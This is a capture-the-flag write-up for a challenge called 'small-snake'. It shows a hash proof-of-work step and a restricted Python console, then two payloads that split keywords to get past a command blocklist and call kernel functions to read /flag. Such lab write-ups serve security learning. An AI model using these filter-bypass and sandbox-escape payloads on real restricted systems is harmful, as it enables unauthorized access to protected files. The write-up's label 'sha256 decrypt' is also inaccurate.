small-snake
=====================================================

## Info
* Category: forensics
* Point: 500 --> 477
* Description: 
    * The flag is in /flag
```
nc small-snake.chal.hackthe.vote 1337
```

## Solution
```
└─$ nc small-snake.chal.hackthe.vote 1337
Give me input where sha256(bhBI0pRbXXhcIyyv + input).hexdigest().endswith('0'*6)
Answer (limit 1024 bytes)>
```
Using sha265 decrypt technique to solve the key to get into the challenge   
Using [small_snake_sha256.py](small_snake_sha256.py) or [solution.py](solution.py) to solve the sha256 problem  
**Noted: The [solution.py](solution.py) is a Python script that automatically run the `nc small-snake.chal.hackthe.vote 1337` and generate input key for sha256, also automatically solve the challenge and give the flag**
```
└─$ nc small-snake.chal.hackthe.vote 1337
Give me input where sha256(DPf0Vayhe7uuIGLM + input).hexdigest().endswith('0'*6)
Answer (limit 1024 bytes)> 4738681
initializing challenge...
[advanced console]
  add_fake_votes(state, candidate, N)  ; it's really this simple
  create_distraction(magnitude)        ; just in case
  destroy_all_records()                ; ...
>
```
In here, I have test for several command and note down several illegal commands or names such as
```
globals
import
path
open
...
```
Seem like the bash terminal here is currently running in Python --> The idea to solve this challenge is to make change to the kernel using shell escaping  
I have two solution command here
```
#1
exec("impor" "t kernel_ffi as k; buf = k.kmalloc(1024); memset(buf, 0, 1024); f = filp_ope" + "n('flag', 0, 0); kernel_read(f, buf, 128, 0); print(k.str(buf))")
```
```
#2
var4 = ‘i’+’m’+’p’+’o’+’r’+’t’+ ‘ kernel_ffi’; exec(var4); func = “filp_o”+”pen”; ffi = kernel_ffi.symbol(func); file_path = “/flag”; flags = 0; mode = 0; var2 = “file = filp_o”+”pen(file_path, flags, mode)”; exec(var2); buffer = kernel_ffi.kmalloc(4096); kernel_read = kernel_ffi.symbol(“kernel_read”); pos = 0; bytes_read = kernel_read(file, buffer, 4096, pos); data = kernel_ffi.str(buffer); print(data);
```
Both of them work well when input into the bash terminal
```
> exec("impor" "t kernel_ffi as k; buf = k.kmalloc(1024); memset(buf, 0, 1024); f = filp_ope" + "n('flag', 0, 0); kernel_read(f, buf, 128, 0); print(k.str(buf))")
 flag{its_like_rust_in_the_kernel_but_better}
```
--> Flag: ` flag{its_like_rust_in_the_kernel_but_better}`